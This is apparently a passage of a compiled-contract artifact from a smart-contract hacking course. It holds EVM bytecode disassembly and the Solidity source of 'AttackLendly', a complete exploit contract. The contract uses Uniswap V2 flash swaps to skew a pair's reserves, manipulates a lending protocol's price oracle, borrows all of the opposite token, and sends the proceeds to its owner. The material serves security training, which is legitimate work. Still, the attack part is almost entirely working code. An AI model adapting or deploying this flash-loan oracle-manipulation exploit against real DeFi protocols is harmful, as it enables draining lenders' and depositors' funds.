ISZERO PUSH2 0xB08 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB2C SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xA9059CBB PUSH2 0xB6E PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBD2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xBF6 SWAP2 SWAP1 PUSH2 0xE4F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xC41 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9F1 SWAP2 SWAP1 PUSH2 0xE2D JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x672 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x112 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT DUP4 AND DUP2 OR DUP5 SSTORE PUSH1 0x40 MLOAD SWAP2 SWAP1 SWAP3 AND SWAP3 DUP4 SWAP2 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP2 SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x9F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x80 DUP7 DUP9 SUB SLT ISZERO PUSH2 0xD3C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP6 CALLDATALOAD PUSH2 0xD47 DUP2 PUSH2 0xD0F JUMP JUMPDEST SWAP5 POP PUSH1 0x20 DUP7 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 DUP7 ADD CALLDATALOAD SWAP3 POP PUSH1 0x60 DUP7 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0xD72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP9 ADD SWAP2 POP DUP9 PUSH1 0x1F DUP4 ADD SLT PUSH2 0xD86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD DUP2 DUP2 GT ISZERO PUSH2 0xD95 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP10 PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0xDA7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP7 SWAP10 SWAP6 SWAP9 POP SWAP4 SWAP7 POP PUSH1 0x20 ADD SWAP5 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDCC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 0xDD7 DUP2 PUSH2 0xD0F JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0xE06 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0xE28 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE3F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xDD7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xE7F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xE99 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xEA2 DUP5 PUSH2 0xE68 JUMP JUMPDEST SWAP3 POP PUSH2 0xEB0 PUSH1 0x20 DUP6 ADD PUSH2 0xE68 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD MLOAD PUSH4 0xFFFFFFFF DUP2 AND DUP2 EQ PUSH2 0xEC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0xEFA JUMPI PUSH1 0x20 DUP2 DUP6 ADD DUP2 ADD MLOAD DUP7 DUP4 ADD DUP3 ADD MSTORE ADD PUSH2 0xEDE JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0xF0C JUMPI PUSH1 0x0 PUSH1 0x20 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0x20 ADD SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE DUP4 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x1 DUP1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0xF4E PUSH1 0x80 DUP4 ADD DUP5 PUSH2 0xED4 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDF CREATE2 0xC0 INVALID RETURN EXTCODEHASH GASPRICE PUSH12 0x4EA61EA383CBB312E30C735D BALANCE SWAP2 0xBC NUMBER 0xAC PUSH32 0x28F4C1D64B8C64736F6C634300080D0033000000000000000000000000000000 ",
  "sha1": "1f3e2ea1eb7402c76ad2a9a493d4d0088b4b0b24",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity 0.8.13;\n\nimport {IUniswapV2Pair} from \"../../interfaces/IUniswapV2.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ninterface ILendly {\n    function deposit(address _token, uint256 _amount) external;\n    function borrow(address _token, uint256 _amount) external;\n}\n\n/**\n * @title AttackLendly\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract AttackLendly is Ownable {\n\n    ILendly immutable private lendly;\n    IUniswapV2Pair immutable private pair;\n    IERC20 immutable private token0;\n    IERC20 immutable private token1;\n    uint256 private reserve0;\n    uint256 private reserve1;\n\n    constructor(address _pair, address _lendly) {\n        pair = IUniswapV2Pair(_pair);\n        lendly = ILendly(_lendly);\n        token0 = IERC20(IUniswapV2Pair(pair).token0());\n        token1 = IERC20(IUniswapV2Pair(pair).token1());\n    }\n\n    function attack() external onlyOwner {\n\n        uint256 wantedLoan;\n        bytes memory data;\n\n        // Get the reserves of the Pair smart contract\n        (reserve0, reserve1,) = pair.getReserves();\n        // Flash loan 99% DAI liquidity, drain all Lendly ETH\n        wantedLoan = reserve0 * 99 / 100;\n        data = abi.encode(token0);\n        pair.swap(wantedLoan, 0, address(this), data);\n\n\n        // Get the reserves of the Pair smart contract\n        // Flash loan 99% WETH liquidity, drain all Lendly DAI\n        (reserve0, reserve1,) = pair.getReserves();\n        wantedLoan = reserve1 * 99 / 100;\n        data = abi.encode(token1);\n        pair.swap(0, wantedLoan, address(this), data);\n\n    }\n\n    function uniswapV2Call(\n        address sender,\n        uint amount0,\n        uint amount1,\n        bytes calldata data\n    ) external {\n\n        // Make sure it's a legit callback\n        require(msg.sender == address(pair), \"not pair\");\n        require(sender == address(this), \"not sender\");\n\n        // Extract the token from the data and revert if it's a wrong token\n        IERC20 token = IERC20(abi.decode(data, (address)));\n        require(token == token0 || token == token1, \"wrong token\");\n\n        uint256 amount = amount0 == 0 ? amount1 : amount0;\n\n        // Deposit 0.1% of the amount\n        uint256 depositAmount = amount * 1 / 1000;\n        token.approve(address(lendly), depositAmount);\n        lendly.deposit(address(token), depositAmount);\n\n        // Determine other token address\n        IERC20 otherToken;\n        uint256 otherTokenReserve;\n        if(token == token0) {\n            otherToken = token1;\n            otherTokenReserve = reserve1;\n        } else {\n            otherToken = token0;\n            otherTokenReserve = reserve0;\n        }\n\n        // Borrow all the other token\n        lendly.borrow(address(otherToken), otherToken.balanceOf(address(lendly)));\n\n        // Pay back only 99.9%\n        uint256 tokenPaymentAmount = amount * 999 / 1000;\n\n        // Amount to pay in the other token OtherToken Reserve * 4 / 1000\n        uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;\n\n        token.transfer(address(pair), tokenPaymentAmount);\n        otherToken.transfer(address(pair), otherTokenPaymentAmount);\n        \n        withdrawProfit();\n    }\n\n    function withdrawProfit() internal {\n        token0.transfer(owner(), token0.balanceOf(address(this)));\n        token1.transfer(owner(), token1.balanceOf(address(this)));\n    }\n\n}",
  "sourcePath": "contracts/oracle-manipulation-2/AttackLendly.sol",
  "type": "contract"
}